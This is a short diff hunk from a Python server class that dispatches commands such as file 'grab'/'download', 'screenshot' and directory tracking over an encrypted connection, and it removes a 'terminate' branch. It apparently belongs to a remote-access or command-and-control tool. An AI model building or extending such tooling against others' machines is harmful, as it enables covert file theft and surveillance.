@@ -77,9 +77,6 @@ class Server(Thread):
             if '[+]' in res:
                 self.cwd = res[11:]
             return res
-        elif 'terminate' in self.command:
-            self.conn.send(encrypt_server('terminate'.encode('ISO-8859-1')))
-            self.connect()
         elif 'grab' in self.command or 'download' in self.command:
             self.download(self.command)
         elif 'screenshot' == self.command:
